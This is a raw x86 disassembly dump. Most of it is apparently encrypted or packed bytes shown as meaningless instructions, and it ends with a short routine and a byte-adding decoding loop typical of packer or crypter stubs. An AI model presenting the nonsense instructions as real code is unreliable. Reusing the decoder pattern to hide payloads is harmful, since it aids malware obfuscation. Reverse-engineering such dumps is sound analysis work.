  4163b7:	sar    DWORD PTR [esp+edx*8+0x41],0xe7
  4163bc:	(bad)  
  4163bd:	xchg   edx,eax
  4163be:	inc    ecx
  4163bf:	mov    ah,0x4e
  4163c1:	retf   0x764
  4163c4:	dec    eax
  4163c5:	mov    ebx,0x302da051
  4163ca:	rcl    BYTE PTR [edi+ebp*2-0x4d],1
  4163ce:	mov    cl,0xcb
  4163d0:	mov    ch,0x98
  4163d2:	pushw  0x8e10
  4163d6:	and    BYTE PTR [edx],dl
  4163d8:	jb     0x4163bd
  4163da:	out    0xfd,al
  4163dc:	sbb    ebx,eax
  4163de:	jno    0x4163db
  4163e0:	jg     0x416430
  4163e2:	jb     0x41645b
  4163e4:	jmp    0xb45d:0xb8722c42
  4163eb:	aaa    
  4163ec:	daa    
  4163ed:	jmp    0xe18ed285
  4163f2:	mov    ebp,0xd3fccfe0
  4163f7:	dec    esi
  4163f8:	add    ecx,DWORD PTR [ebp+0x1a55d416]
  4163fe:	stc    
  4163ff:	pop    ebx
  416400:	pop    ecx
  416401:	(bad)
  416405:	int    0x47
  416407:	xchg   esi,eax
  416408:	push   edi
  416409:	mov    ebp,0x8ddca4d2
  41640e:	pop    ss
  41640f:	jno    0x4163d7
  416411:	jg     0x4163a1
  416413:	gs test eax,0x29906840
  416419:	and    ecx,eax
  41641b:	test   BYTE PTR [edi],ch
  41641d:	pop    ecx
  41641e:	xor    DWORD PTR [ebx+0x33994982],ecx
  416424:	jmp    0xcfe9:0x610d353b
  41642b:	add    esp,edi
  41642d:	xor    edi,edi
  41642f:	fsubr  DWORD PTR [edx+0x1e15fc90]
  416435:	cli    
  416436:	and    DWORD PTR [ebp+0x4f5311f0],edx
  41643c:	cwde   
  41643d:	cmp    bh,BYTE PTR [ebp+eax*1+0x129b640b]
  416444:	popf   
  416445:	rcr    DWORD PTR [esi+ebp*2],0x1b
  416449:	mov    dl,BYTE PTR [edx-0x1c3d4b5a]
  41644f:	jecxz  0x4164cb
  416451:	adc    eax,0x2c38d76a
  416456:	or     ah,0xf8
  416459:	shl    BYTE PTR [esi],cl
  41645b:	mov    ds:0xbd036c6a,al
  416460:	xor    al,0xf8
  416462:	aad    0xaf
  416464:	push   edx
  416465:	scas   al,BYTE PTR es:[edi]
  416466:	lods   eax,DWORD PTR ss:[esi]
  416468:	push   ebp
  416469:	dec    edx
  41646a:	cdq    
  41646b:	xor    al,0x8a
  41646d:	jecxz  0x416419
  41646f:	or     eax,0x3d699150
  416474:	popa   
  416475:	push   ebp
  416476:	sbb    BYTE PTR [ecx-0x456493d6],ch
  41647c:	xchg   BYTE PTR [ebp+0xf],dh
  41647f:	xchg   esp,eax
  416480:	push   cs
  416481:	call   0xf283:0x6e1a682e
  416488:	jle    0x41648e
  41648a:	sbb    edx,DWORD PTR [ebx-0x281c602b]
  416490:	mov    BYTE PTR [eax],al
  416492:	cmp    edx,DWORD PTR [eax+0xc]
  416495:	cmp    DWORD PTR [ecx-0x73f44b07],eax
  41649b:	mov    edi,0xdb93c96f
  4164a0:	data16 lods al,BYTE PTR ds:[esi]
  4164a2:	nop
  4164a3:	sbb    ch,BYTE PTR ds:0x909b5c55
  4164a9:	lahf   
  4164aa:	retf   
  4164ab:	pop    esp
  4164ac:	mov    BYTE PTR [edi-0x64],dl
  4164af:	in     al,dx
  4164b0:	push   es
  4164b1:	mov    cs,WORD PTR [esi+ebx*4-0x3e6c9931]
  4164b8:	mov    BYTE PTR [ebx],ch
  4164ba:	ds mov bl,0xcc
  4164bd:	jno    0x416457
  4164bf:	retf   0xea4e
  4164c2:	xchg   esp,eax
  4164c3:	cmp    al,0x9c
  4164c5:	dec    ebp
  4164c6:	idiv   dh
  4164c8:	fs retf 
  4164ca:	jno    0x41649a
  4164cc:	lea    edx,[ecx+0x16]
  4164cf:	je     0x416491
  4164d1:	xchg   ebp,eax
  4164d2:	in     al,0xf5
  4164d4:	pop    esi
  4164d5:	push   ds
  4164d6:	cmp    DWORD PTR [esi+0x2d],eax
  4164d9:	or     al,0x90
  4164db:	lds    edx,FWORD PTR [eax+esi*1+0xf]
  4164df:	loopne 0x41653c
  4164e1:	div    ecx
  4164e3:	adc    DWORD PTR [esp+edi*2+0x6f980937],ecx
  4164ea:	fs ret 
  4164ec:	call   0x2290:0x6f568dea
  4164f3:	dec    edi
  4164f4:	adc    eax,0x278057d3
  4164f9:	pop    ebp
  4164fa:	dec    ecx
  4164fb:	sub    edx,edi
  4164fd:	push   es
  4164fe:	inc    eax
  4164ff:	lds    edx,FWORD PTR [edx]
  416501:	dec    ecx
  416503:	rcr    DWORD PTR [edx+eax*4+0x49],0xa5
  416508:	mov    ah,BYTE PTR [esi]
  41650a:	adc    eax,0x6e5c74d3
  41650f:	lahf   
  416510:	inc    esp
  416511:	nop
  416512:	aaa    
  416513:	rcr    ebx,cl
  416515:	ficom  DWORD PTR [ebx]
  416517:	xor    al,0x9f
  416519:	ja     0x4164f9
  41651b:	mov    eax,0xb22c6242
  416520:	jo     0x416588
  416522:	in     al,dx
  416523:	nop
  416524:	sbb    ebp,esi
  416526:	xchg   ebx,eax
  416527:	dec    eax
  416528:	mov    al,0xd0
  41652a:	in     al,dx
  41652b:	stc    
  41652c:	rcr    BYTE PTR [edx],0xcb
  41652f:	out    0xd0,eax
  416531:	(bad)  
  416532:	jne    0x41652e
  416534:	ss out dx,eax
  416536:	mov    ebp,0xb8c53a52
  41653b:	mov    ebx,0x526edc37
  416540:	or     BYTE PTR [edx],bl
  416542:	mov    cl,0x77
  416544:	fst    DWORD PTR [ebp-0x3b756061]
  41654a:	push   ds
  41654b:	push   0x9c3dab2
  416550:	je     0x416594
  416552:	aad    0x3b
  416554:	xor    BYTE PTR [eax],ch
  416556:	fbld   TBYTE PTR ds:0xaecbc13e
  41655c:	das    
  41655d:	ja     0x416578
  41655f:	lods   al,BYTE PTR ds:[esi]
  416560:	(bad)  
  416561:	jmp    0x4152f23d
  416566:	push   ss
  416567:	jle    0x416559
  416569:	push   esi
  41656a:	(bad)  
  41656b:	das    
  41656c:	in     al,0x52
  41656e:	push   edx
  41656f:	jb     0x416592
  416571:	shl    DWORD PTR [ecx-0x647789c8],0x80
  416578:	xor    eax,0x5d416d1
  41657d:	pop    edi
  41657e:	xchg   ecx,eax
  41657f:	mov    ds:0x37fe4be1,eax
  416584:	imul   ebx,DWORD PTR [ecx-0x40],0x21b446a9
  41658b:	adc    DWORD PTR [edi-0xf],ebp
  41658e:	js     0x4165e5
  416590:	(bad)  
  416591:	xor    bl,BYTE PTR [eax-0x14efbe52]
  416597:	icebp  
  416598:	pushf  
  416599:	aam    0x60
  41659b:	cmp    BYTE PTR [edx+0x11],dh
  41659e:	or     BYTE PTR [esp+eiz*2-0x31ec566d],bl
  4165a5:	sahf   
  4165a6:	dec    esp
  4165a7:	in     al,dx
  4165a8:	stos   BYTE PTR es:[edi],al
  4165a9:	jle    0x41656d
  4165ab:	pusha  
  4165ac:	jb     0x416558
  4165ae:	sub    al,0xae
  4165b1:	fisttp WORD PTR [esp+ecx*2]
  4165b4:	in     eax,0xe9
  4165b6:	pop    ss
  4165b7:	in     al,0xc1
  4165b9:	and    BYTE PTR [ecx+0xe13f002],0x82
  4165c0:	cmp    BYTE PTR [ebx-0x84627f8],bl
  4165c6:	das    
  4165c7:	mov    ebx,0xa6fe98a4
  4165cc:	mov    edi,DWORD PTR [ebx+0x7464113d]
  4165d2:	rcl    al,cl
  4165d4:	stos   BYTE PTR es:[edi],al
  4165d5:	dec    edi
  4165d6:	das    
  4165d7:	dec    edi
  4165d8:	(bad)  
  4165da:	js     0x41656f
  4165dc:	int3   
  4165dd:	cmp    bl,ah
  4165df:	and    bh,dl
  4165e1:	push   0xf57c7a50
  4165e6:	aam    0xab
  4165e8:	out    dx,eax
  4165e9:	rol    BYTE PTR [edi],1
  4165eb:	cld    
  4165ec:	fwait
  4165ed:	pop    ecx
  4165ee:	ds mov bl,0xaf
  4165f1:	(bad)  
  4165f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4165f3:	std    
  4165f4:	inc    edi
  4165f5:	jno    0x416658
  4165f7:	pop    ebp
  4165f8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165f9:	inc    edx
  4165fa:	sbb    eax,0x84dbb1a6
  4165ff:	(bad)  
  416601:	push   edi
  416602:	in     al,0x4
  416604:	daa    
  416605:	arpl   cx,cx
  416607:	(bad)  
  416608:	popa   
  416609:	cmc    
  41660a:	sub    BYTE PTR [ebx+0x44],bh
  41660d:	adc    esi,edx
  41660f:	popf   
  416610:	adc    BYTE PTR [ebp-0x1e60c73e],bl
  416616:	or     BYTE PTR [ecx-0x12f723c],dh
  41661c:	push   esi
  41661d:	cmc    
  41661e:	xchg   ebx,eax
  41661f:	mov    ds:0x1cd9d9b6,eax
  416624:	and    ebp,DWORD PTR [ebx+ebx*2-0x3]
  416628:	aam    0xe8
  41662a:	and    edx,esp
  41662c:	push   esp
  41662d:	iret   
  41662e:	hlt    
  41662f:	push   ebx
  416630:	cs xchg ecx,eax
  416632:	sti    
  416633:	jle    0x416619
  416635:	mov    eax,ecx
  416637:	push   0xffffffb7
  416639:	in     al,dx
  41663a:	pop    ecx
  41663b:	mov    al,0x7
  41663d:	cmp    edi,ecx
  41663f:	ficomp DWORD PTR ds:0x7cc16ad3
  416645:	adc    bh,BYTE PTR [edx-0x6327738f]
  41664b:	inc    eax
  41664c:	pop    ss
  41664d:	ficomp WORD PTR [esi+0x60]
  416650:	lods   eax,DWORD PTR ds:[esi]
  416651:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416652:	jge    0x416694
  416654:	cmp    BYTE PTR [edi+0x16],cl
  416657:	stos   BYTE PTR es:[edi],al
  416658:	or     dl,BYTE PTR [ebp-0xe]
  41665b:	lock nop
  41665d:	data16 js 0x41664f
  416660:	add    eax,0x22a4484b
  416665:	mov    cl,0xe2
  416667:	shl    DWORD PTR [ecx-0x34],0xd2
  41666b:	sti    
  41666c:	add    DWORD PTR [bp+si-0x2d],0xb16bac38
  416674:	mov    DWORD PTR [eax+0x69],0x9d3c0e7b
  41667b:	mov    ah,BYTE PTR [eax]
  41667d:	lds    eax,FWORD PTR [edi+0x6ba58de6]
  416683:	inc    edi
  416684:	enter  0x6fb,0xca
  416688:	ret    0xa125
  41668b:	inc    edi
  41668c:	inc    esp
  41668d:	call   0x721d465c
  416692:	sub    BYTE PTR ss:[edi-0x4c7e9f1a],ah
  416699:	imul   esi,DWORD PTR [edi-0x7d],0x3c1cd7cf
  4166a0:	jge    0x41671c
  4166a2:	or     BYTE PTR [esi-0x6dacfbea],bl
  4166a8:	push   0xffffffec
  4166aa:	(bad)  
  4166ab:	out    dx,al
  4166ac:	inc    eax
  4166ad:	into   
  4166ae:	es loope 0x416697
  4166b1:	stos   DWORD PTR es:[edi],eax
  4166b2:	xchg   edx,eax
  4166b3:	aad    0x6c
  4166b5:	jl     0x416658
  4166b7:	jl     0x416721
  4166b9:	test   eax,0x4212e9c4
  4166be:	sub    DWORD PTR [ecx+0x45],edx
  4166c1:	lahf   
  4166c2:	pop    edx
  4166c3:	push   ebx
  4166c4:	pop    es
  4166c5:	out    dx,eax
  4166c6:	and    DWORD PTR [esi+0x61],esi
  4166c9:	jmp    0x4166f7
  4166cb:	xchg   edi,eax
  4166cc:	xchg   esi,eax
  4166cd:	dec    ebx
  4166ce:	add    esp,DWORD PTR [ebx-0xd]
  4166d1:	fs push gs
  4166d4:	mov    ecx,0x11c721c0
  4166d9:	outs   dx,BYTE PTR ds:[esi]
  4166da:	push   esi
  4166db:	mov    al,0x69
  4166dd:	data16 ror cl,0xf2
  4166e1:	in     eax,0x4a
  4166e3:	xchg   DWORD PTR [edx-0x51f1fda],edi
  4166e9:	add    DWORD PTR [eax+0x53],0x71ca6f32
  4166f0:	lahf   
  4166f1:	push   ebp
  4166f2:	test   ecx,0x91294668
  4166f8:	push   eax
  4166f9:	or     eax,0xf507030
  4166fe:	ins    DWORD PTR es:[edi],dx
  4166ff:	leave  
  416700:	jae    0x41669c
  416702:	pop    es
  416703:	push   ecx
  416704:	repz pop edi
  416706:	(bad)  
  416707:	iret   
  416708:	out    0x92,al
  41670a:	das    
  41670b:	push   esp
  41670c:	(bad)  
  41670d:	fld    st(2)
  41670f:	or     bl,al
  416711:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416712:	cwde   
  416713:	shl    BYTE PTR [ecx+0x7d1ca80d],1
  416719:	and    al,0x2
  41671b:	loop   0x41672e
  41671d:	mov    ch,0x15
  41671f:	push   ebp
  416720:	(bad)  
  416721:	pop    eax
  416722:	lea    esp,[ebx+0x51]
  416725:	pushf  
  416726:	adc    al,0x15
  416728:	(bad)  
  41672a:	call   0x29ceaeb
  41672f:	xchg   edi,eax
  416730:	mov    ah,0x38
  416732:	jl     0x416714
  416734:	das    
  416735:	jo     0x4166ea
  416737:	push   0x44
  416739:	mov    bl,0x91
  41673b:	lock add esp,DWORD PTR [eax+0x114280ea]
  416742:	int3   
  416743:	xchg   edi,eax
  416744:	add    DWORD PTR [esi],ecx
  416746:	ror    DWORD PTR [ecx+edi*1],1
  416749:	mov    ds:0x7b721a12,al
  41674e:	in     al,dx
  41674f:	mov    ecx,0xdaa88b63
  416754:	inc    esp
  416755:	or     ch,BYTE PTR [ebp-0x1d07b317]
  41675b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41675c:	das    
  41675d:	test   BYTE PTR [edx+0x78deef8f],al
  416763:	shr    DWORD PTR [ebx],cl
  416765:	pop    ss
  416766:	int3   
  416767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416768:	push   ds
  416769:	mov    ds:0x48d97c39,eax
  41676e:	call   0x236f:0xd94edfe5
  416775:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416776:	aam    0xf8
  416778:	cmp    BYTE PTR [ecx+0x2dc284b3],0x1f
  41677f:	sbb    BYTE PTR [esp+ebx*1-0x1b],0xf8
  416784:	fidiv  DWORD PTR fs:[eiz*4-0x74683e14]
  41678c:	inc    ebx
  41678d:	fisub  DWORD PTR [edi]
  41678f:	pop    edi
  416790:	add    BYTE PTR [ebp+0x3334dfc3],cl
  416796:	jg     0x41674d
  416798:	sub    al,BYTE PTR [edx+0x7e]
  41679b:	push   esp
  41679c:	push   ss
  41679d:	cmp    DWORD PTR [edi+0x43],edi
  4167a0:	and    DWORD PTR ds:0x27a87e91,ecx
  4167a6:	fadd   QWORD PTR [ecx+0x44]
  4167a9:	scas   al,BYTE PTR es:[edi]
  4167aa:	or     DWORD PTR [ebx],ebp
  4167ac:	xor    BYTE PTR [edx],0xa7
  4167af:	int    0xbe
  4167b1:	or     al,0xd7
  4167b3:	inc    eax
  4167b4:	call   DWORD PTR [ecx+0x44a4e2c]
  4167ba:	imul   ecx,edx,0x1a
  4167bd:	dec    eax
  4167be:	loopne 0x41675e
  4167c0:	dec    ecx
  4167c1:	xchg   ebx,ebx
  4167c3:	popa   
  4167c4:	push   edx
  4167c5:	out    dx,eax
  4167c6:	mov    ch,0xa
  4167c8:	das    
  4167c9:	push   es
  4167ca:	out    0x9f,al
  4167cc:	and    BYTE PTR [ecx],cl
  4167ce:	test   al,0xe0
  4167d0:	loope  0x416779
  4167d2:	std    
  4167d3:	fdiv   DWORD PTR [edi-0x3e]
  4167d6:	fiadd  WORD PTR [esi+0x45]
  4167d9:	popf   
  4167da:	mov    edx,0x41491eb5
  4167df:	retf   
  4167e0:	inc    esi
  4167e1:	jne    0x41677e
  4167e3:	sub    bl,0xda
  4167e6:	jl     0x4167c4
  4167e8:	int3   
  4167e9:	cmp    eax,0x5d7cd73d
  4167ee:	pop    esp
  4167ef:	xchg   ebx,eax
  4167f0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4167f1:	push   cs
  4167f2:	rol    BYTE PTR [edi-0x5],cl
  4167f5:	jno    0x41682d
  4167f7:	aaa    
  4167f8:	sub    eax,0x6772c63e
  4167fd:	and    DWORD PTR [esp+esi*2+0x1e78d947],esi
  416804:	adc    DWORD PTR [eax+0x4c],esp
  416807:	ins    BYTE PTR es:[edi],dx
  416808:	inc    edi
  416809:	cwde   
  41680a:	jmp    0x41679a
  41680c:	aam    0x5b
  41680e:	mov    esi,0xabdcd011
  416813:	adc    eax,0xfe7f7026
  416818:	ss xchg ecx,eax
  41681a:	sahf   
  41681b:	pcmpeqd mm1,QWORD PTR [ecx+0x4c]
  41681f:	add    al,0x1c
  416821:	mov    ebx,0x9c5f8d2f
  416826:	add    BYTE PTR [esp+edi*4-0x48],dl
  41682a:	add    al,0xb1
  41682c:	jmp    0x1b356601
  416831:	pop    ebp
  416832:	les    ecx,FWORD PTR [esi]
  416834:	push   ebp
  416835:	mov    edx,0x26a0904a
  41683a:	call   FWORD PTR [ebp-0x32b22f0e]
  416840:	push   edi
  416841:	mov    ah,0xcb
  416843:	push   ebp
  416844:	cdq    
  416845:	inc    ecx
  416846:	and    al,0xbf
  416848:	xor    BYTE PTR [ebx],bl
  41684a:	iret   
  41684b:	fstp   DWORD PTR [ebp+0x49]
  41684e:	inc    ecx
  41684f:	mov    BYTE PTR ds:0xe822fbad,al
  416855:	aaa    
  416856:	xor    al,0xcc
  416858:	xchg   edx,eax
  416859:	add    ebp,DWORD PTR [ebx]
  41685b:	pop    ss
  41685c:	sar    BYTE PTR [edx],1
  41685e:	lds    ecx,FWORD PTR [ecx-0x4afb439]
  416864:	ins    DWORD PTR es:[edi],dx
  416865:	mov    eax,ds:0x9a4c90eb
  41686a:	shl    ebp,cl
  41686c:	add    DWORD PTR [ecx-0x2fa77594],eax
  416872:	sahf   
  416873:	ins    BYTE PTR es:[edi],dx
  416874:	into   
  416875:	enter  0x48da,0xdf
  416879:	cmp    bl,BYTE PTR [ebx+0x1f]
  41687c:	les    edx,FWORD PTR [eax+0xf]
  41687f:	(bad)  
  416880:	std    
  416881:	ret    0x6654
  416884:	(bad)  
  416885:	mov    ds:0xc292262a,eax
  41688a:	xchg   esp,eax
  41688b:	retf   
  41688c:	(bad)  
  41688d:	fs jp  0x416899
  416890:	xchg   ebx,eax
  416891:	and    ebx,DWORD PTR [ecx+0x62952f47]
  416897:	mul    ah
  416899:	push   ss
  41689a:	add    DWORD PTR [eax-0x4b4e0e7d],edi
  4168a0:	(bad)  
  4168a1:	fdiv   QWORD PTR [esi]
  4168a3:	ror    DWORD PTR [edi],1
  4168a5:	xor    cl,BYTE PTR ds:0x74b6905d
  4168ab:	test   al,0x4c
  4168ad:	daa    
  4168ae:	sub    ch,BYTE PTR [edi]
  4168b0:	loopne 0x4168cc
  4168b2:	fcom   st(3)
  4168b4:	xchg   BYTE PTR [esi+0x60],ch
  4168b7:	imul   eax,DWORD PTR [esi-0x3e6b4aa7],0x4bc4ae24
  4168c1:	dec    eax
  4168c2:	jle    0x4168f7
  4168c4:	ins    DWORD PTR es:[edi],dx
  4168c5:	xor    al,0xd0
  4168c7:	imul   DWORD PTR [ebx-0x3e]
  4168ca:	data16 jbe 0x4168c4
  4168cd:	int    0xb1
  4168cf:	(bad)  
  4168d0:	jmp    0xdc90:0xcacb66ee
  4168d7:	or     BYTE PTR [ecx],al
  4168d9:	or     eax,0xab18904e
  4168de:	pop    es
  4168df:	cmp    eax,0x16bd2789
  4168e4:	mov    edi,0x426c02ec
  4168e9:	ret    0x22e5
  4168ec:	sbb    eax,0x3961c975
  4168f1:	aaa    
  4168f2:	repz in eax,dx
  4168f4:	jmp    0xd20409d1
  4168f9:	cs mov dl,0x80
  4168fc:	xor    eax,0xa38de645
  416901:	fcomp  st(1)
  416903:	inc    edx
  416904:	fldcw  WORD PTR [ecx-0x2b]
  416907:	jne    0x416966
  416909:	and    ecx,0x27
  41690c:	mov    edx,0xcb13123
  416911:	cli    
  416912:	mov    BYTE PTR [eax-0x435cca43],al
  416918:	inc    edi
  416919:	fldenv [esi]
  41691b:	fsubp  st(7),st
  41691d:	cs jl  0x4168f5
  416920:	pop    es
  416921:	and    ch,BYTE PTR [edx+0x6]
  416924:	push   edi
  416925:	xor    ebx,DWORD PTR [ebp-0x7f9be877]
  41692b:	adc    DWORD PTR [esi+0x4b05c656],ebx
  416931:	ss pop esi
  416933:	inc    esp
  416934:	lea    edi,[edi+0x7a]
  416937:	mov    ebp,0x1dc6e754
  41693c:	mov    ds,WORD PTR [edi+0x1a]
  41693f:	hlt    
  416940:	sub    BYTE PTR [ebx+0x32ce25c1],dl
  416946:	mov    ah,bh
  416948:	jp     0x416990
  41694a:	adc    eax,0x779d5893
  41694f:	pop    edi
  416950:	mov    ah,0x9
  416952:	sbb    eax,0xc904d2cd
  416957:	dec    ebp
  416958:	in     al,dx
  416959:	cli    
  41695a:	xchg   edx,eax
  41695b:	iret   
  41695c:	lea    ebx,[edx-0x49e6e286]
  416962:	or     eax,DWORD PTR [ecx-0x57dc9d4d]
  416968:	es mov esp,0x7eeb7e84
  41696e:	aas    
  41696f:	fwait
  416970:	cmp    eax,0xad143da7
  416975:	dec    ebx
  416976:	xor    eax,0xbeb9e89d
  41697b:	js     0x416933
  41697d:	std    
  41697e:	mov    ah,0x42
  416980:	rcl    eax,0xad
  416983:	mov    al,ds:0x6033c7d5
  416988:	popf   
  416989:	push   ecx
  41698a:	div    BYTE PTR [ecx]
  41698c:	inc    ecx
  41698d:	in     al,0xb
  41698f:	mov    esi,DWORD PTR [ebp-0x4]
  416992:	call   esi
  416994:	mov    DWORD PTR [ebp-0x38],eax
  416997:	cmp    DWORD PTR [ebp-0x38],0x57
  41699b:	jne    0x4169a9
  41699d:	mov    edx,DWORD PTR [ebp-0x20]
  4169a0:	push   edx
  4169a1:	call   0x401000
  4169a6:	add    esp,0x4
  4169a9:	xor    eax,eax
  4169ab:	pop    esi
  4169ac:	mov    esp,ebp
  4169ae:	pop    ebp
  4169af:	ret    
  4169b0:	push   ebp
  4169b1:	mov    ebp,esp
  4169b3:	sub    esp,0x124
  4169b9:	xor    eax,eax
  4169bb:	mov    esp,ebp
  4169bd:	pop    ebp
  4169be:	ret    
  4169bf:	push   ebp
  4169c0:	mov    ebp,esp
  4169c2:	sub    esp,0x2c
  4169c5:	push   ebx
  4169c6:	mov    DWORD PTR [ebp-0x4],0xfffffffe
  4169cd:	mov    DWORD PTR [ebp-0xc],0x0
  4169d4:	mov    DWORD PTR [ebp-0x20],0x1
  4169db:	mov    DWORD PTR [ebp-0x10],0x0
  4169e2:	mov    eax,DWORD PTR [ebp+0xc]
  4169e5:	mov    DWORD PTR [ebp-0x1c],eax
  4169e8:	mov    DWORD PTR [ebp-0x18],0x0
  4169ef:	mov    DWORD PTR [ebp-0x8],0x0
  4169f6:	mov    DWORD PTR [ebp-0x24],0x0
  4169fd:	mov    ecx,DWORD PTR [ebp-0x4]
  416a00:	sub    ecx,0x1
  416a03:	mov    DWORD PTR [ebp-0x4],ecx
  416a06:	mov    edx,DWORD PTR [ebp+0x8]
  416a09:	mov    DWORD PTR [ebp-0x10],edx
  416a0c:	mov    DWORD PTR [ebp-0x28],0x1
  416a13:	mov    eax,DWORD PTR [ebp-0x4]
  416a16:	add    eax,0x2
  416a19:	mov    DWORD PTR [ebp-0x4],eax
  416a1c:	mov    ecx,DWORD PTR [ebp-0x1c]
  416a1f:	add    ecx,DWORD PTR [ebp-0x4]
  416a22:	mov    dl,BYTE PTR [ecx+0x1]
  416a25:	mov    BYTE PTR [ebp-0x11],dl
  416a28:	mov    eax,DWORD PTR [ebp-0x4]
  416a2b:	add    eax,0x1
  416a2e:	mov    DWORD PTR [ebp-0x4],eax
  416a31:	mov    cl,BYTE PTR [ebp-0x11]
  416a34:	mov    BYTE PTR [ebp-0x29],cl
  416a37:	push   edx
  416a38:	pop    ebx
  416a39:	mov    ecx,ebx
  416a3b:	mov    edx,DWORD PTR [ebp-0x10]
  416a3e:	add    edx,DWORD PTR [ebp-0x4]
  416a41:	mov    al,BYTE PTR [ebp-0x29]
  416a44:	mov    BYTE PTR [edx],al
  416a46:	mov    ebx,esi
  416a48:	mov    ecx,DWORD PTR [ebp+0x14]
  416a4b:	add    ecx,DWORD PTR [ebp-0x8]
  416a4e:	movzx  edx,BYTE PTR [ecx]
  416a51:	mov    DWORD PTR [ebp-0xc],edx
  416a54:	mov    eax,DWORD PTR [ebp-0x8]
  416a57:	mov    ecx,DWORD PTR [ebp-0x28]
  416a5a:	add    eax,ecx
  416a5c:	mov    DWORD PTR [ebp-0x8],eax
  416a5f:	mov    eax,DWORD PTR [ebp-0x8]
  416a62:	shr    eax,0x3
  416a65:	mov    ecx,0x1
  416a6a:	sub    ecx,eax
  416a6c:	mov    DWORD PTR [ebp-0x20],ecx
  416a6f:	shr    eax,cl
  416a71:	mov    edx,DWORD PTR [ebp-0x8]
  416a74:	imul   edx,DWORD PTR [ebp-0x20]
  416a78:	mov    DWORD PTR [ebp-0x8],edx
  416a7b:	shl    ebx,0x3
  416a7e:	mov    eax,DWORD PTR [ebp-0x10]
  416a81:	add    eax,DWORD PTR [ebp-0x4]
  416a84:	movzx  ecx,BYTE PTR [eax]
  416a87:	add    ecx,DWORD PTR [ebp-0xc]
  416a8a:	mov    edx,DWORD PTR [ebp-0x10]
  416a8d:	add    edx,DWORD PTR [ebp-0x4]
  416a90:	mov    BYTE PTR [edx],cl
  416a92:	mov    eax,DWORD PTR [ebp-0x4]
  416a95:	sub    eax,0x2
  416a98:	mov    DWORD PTR [ebp-0x4],eax
  416a9b:	mov    ecx,DWORD PTR [ebp-0x4]
  416a9e:	cmp    ecx,DWORD PTR [ebp+0x10]
  416aa1:	jl     0x416a13
  416aa7:	pop    ebx
  416aa8:	mov    esp,ebp
  416aaa:	pop    ebp
  416aab:	ret    
  416aac:	jmp    DWORD PTR ds:0x417020
